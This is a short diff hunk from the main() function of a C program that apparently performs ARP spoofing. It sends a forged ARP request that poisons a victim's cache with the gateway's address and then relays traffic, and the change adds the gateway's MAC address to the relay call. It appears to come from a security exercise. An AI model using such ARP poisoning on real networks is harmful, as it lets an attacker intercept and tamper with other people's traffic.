@@ -46,7 +46,7 @@ int main(int argc, char *argv[])
 	reply(dev, pcap, victim_mac);
 	print_mac(victim_mac);
 	request(dev, pcap, victim_mac, attacker_mac, attacker_mac, gate_ip, victim_mac, victim_ip, 1);
-	relay(dev, pcap, attacker_mac, victim_mac);
+	relay(dev, pcap, attacker_mac, victim_mac, gate_mac);
 	// request(dev, pcap, gate_mac, attacker_mac, attacker_mac, victim_ip, gate_mac, gate_ip, 1);
 
 	return 0;
